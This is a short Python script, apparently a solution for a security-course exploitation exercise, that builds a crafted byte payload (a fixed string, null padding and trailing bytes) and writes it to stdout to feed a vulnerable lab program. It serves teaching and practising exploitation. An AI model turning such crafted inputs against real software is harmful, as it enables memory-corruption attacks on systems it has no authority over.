#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
padding = b'\x00'*6
payload = (b'mgg2')+padding+(b'A+')
sys.stdout.buffer.write(payload)

